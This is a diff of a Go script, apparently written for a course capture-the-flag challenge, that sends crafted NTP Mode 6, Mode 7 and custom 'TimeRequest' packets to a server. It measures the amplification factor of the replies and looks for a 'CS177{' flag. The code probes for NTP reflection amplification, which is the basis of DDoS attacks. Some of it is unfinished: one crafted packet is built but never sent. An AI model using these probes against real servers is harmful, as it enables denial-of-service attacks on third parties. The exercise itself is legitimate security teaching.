@@ -45,79 +45,76 @@ func main() {
 
 	conn.SetReadDeadline(time.Now().Add(timeout))
 
-	// Combine multiple requests
-	combinedRequests := [][]byte{
-		{0x16, 0x02, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00},
-		{0x17, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00},
-		[]byte("TimeRequest 255.255.255.255"),
+	// Try Mode 6 (Control) message with different request codes
+	mode6Requests := [][]byte{
+		{0x16, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00}, // Request code 2
+		{0x16, 0x02, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00}, // Request code 3
+		{0x16, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00}, // Request code 4
 	}
 
-	var totalSent, totalReceived int
-	for _, request := range combinedRequests {
-		if len(request) < 48 {
-			request = append(request, make([]byte, 48-len(request))...)
-		}
+	for _, request := range mode6Requests {
+		request = append(request, make([]byte, 40)...)
 		response, err := sendRequest(conn, request)
 		if err != nil {
 			fmt.Println(err)
 		} else {
-			totalSent += len(request)
-			totalReceived += len(response)
+			checkAmplification(request, response)
 		}
-		time.Sleep(100 * time.Millisecond) // Small delay between requests
 	}
 
-	checkAmplification(totalSent, totalReceived)
-
-	// Exploit server reset behavior
-	fmt.Println("Waiting for server reset...")
-	time.Sleep(12 * time.Second)
-
-	// Use larger poll interval
-	largePolRequest := make([]byte, 48)
-	largePolRequest[0] = 0x1b                                                         // LI = 0, VN = 3, Mode = 3 (client)
-	binary.BigEndian.PutUint32(largePolRequest[4:8], 0xffffffff)                      // Root Delay
-	binary.BigEndian.PutUint32(largePolRequest[8:12], 0xffffffff)                     // Root Dispersion
-	binary.BigEndian.PutUint32(largePolRequest[12:16], 0x4C4F4F50)                    // Reference ID: "LOOP"
-	binary.BigEndian.PutUint64(largePolRequest[16:24], uint64(time.Now().Unix())<<32) // Reference Timestamp
-	largePolRequest[2] = 17                                                           // Poll interval: 2^17 seconds
-
-	response, err := sendRequest(conn, largePolRequest)
-	if err != nil {
-		fmt.Println(err)
-	} else {
-		checkAmplification(largePolRequest, response)
+	// Try custom TimeRequest command with different IPs
+	timeRequests := []string{
+		"TimeRequest 255.255.255.255",
+		"TimeRequest 127.0.0.1",
+		"TimeRequest 8.8.8.8",
 	}
+
+	for _, request := range timeRequests {
+		response, err := sendRequest(conn, []byte(request))
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			checkAmplification([]byte(request), response)
+		}
+	}
+
+	// Try Mode 7 (Private) message with different request types
+	mode7Requests := [][]byte{
+		{0x17, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00}, // Request type 0
+		{0x17, 0x00, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00}, // Request type 1
+		{0x17, 0x00, 0x03, 0x02, 0x00, 0x00, 0x00, 0x00}, // Request type 2
+	}
+
+	for _, request := range mode7Requests {
+		request = append(request, make([]byte, 40)...)
+		response, err := sendRequest(conn, request)
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			checkAmplification(request, response)
+		}
+	}
+
+	// Try a crafted NTP packet with specific fields set
+	craftedRequest := make([]byte, 48)
+	craftedRequest[0] = 0x1b                                    // LI = 0, VN = 3, Mode = 3 (client)
+	binary.BigEndian.PutUint32(craftedRequest[4:8], 0xdeadbeef) // Transmit Timestamp
 }
 
-func checkAmplification(request interface{}, response interface{}) {
-	var reqLen, respLen int
-	switch v := request.(type) {
-	case []byte:
-		reqLen = len(v)
-	case int:
-		reqLen = v
-	}
-	switch v := response.(type) {
-	case []byte:
-		respLen = len(v)
-	case int:
-		respLen = v
-	}
-
-	amplification := float64(respLen) / float64(reqLen)
-	fmt.Printf("Sent %d bytes, received %d bytes\n", reqLen, respLen)
+func checkAmplification(request, response []byte) {
+	amplification := float64(len(response)) / float64(len(request))
+	fmt.Printf("Sent %d bytes, received %d bytes\n", len(request), len(response))
 	fmt.Printf("Amplification factor: %.2f\n", amplification)
 
-	if amplification >= 5 {
+	if amplification >= 9 {
 		fmt.Println("Achieved required amplification factor!")
-		checkForFlag(response.([]byte))
+		checkForFlag(response)
 	}
 }
 
 func checkForFlag(response []byte) {
 	responseStr := string(response)
-	if flagIndex := strings.Index(responseStr, "cs177{"); flagIndex != -1 {
+	if flagIndex := strings.Index(responseStr, "CS177{"); flagIndex != -1 {
 		endIndex := strings.Index(responseStr[flagIndex:], "}") + flagIndex + 1
 		if endIndex > flagIndex {
 			fmt.Println("Flag found:", responseStr[flagIndex:endIndex])
